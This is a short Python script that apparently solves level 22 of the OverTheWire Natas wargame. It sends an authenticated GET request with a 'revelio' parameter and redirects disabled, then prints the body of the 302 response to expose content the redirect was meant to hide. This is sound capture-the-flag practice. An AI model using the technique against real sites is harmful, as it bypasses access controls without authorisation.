import requests

url = "http://natas22.natas.labs.overthewire.org/"
auth = ("natas22", "secret")

payload = {"revelio": "1"}

print("[*] . . . Injecting . . . ")

response = requests.get(url, auth=auth, params=payload, allow_redirects=False)

print(f"[*]Response Status: {response.status_code}")
if (response.status_code) == 302:
    print("[+]Payload successfully injected!")

    print("--- BODY OF RESPONSE ---")
    print(response.text)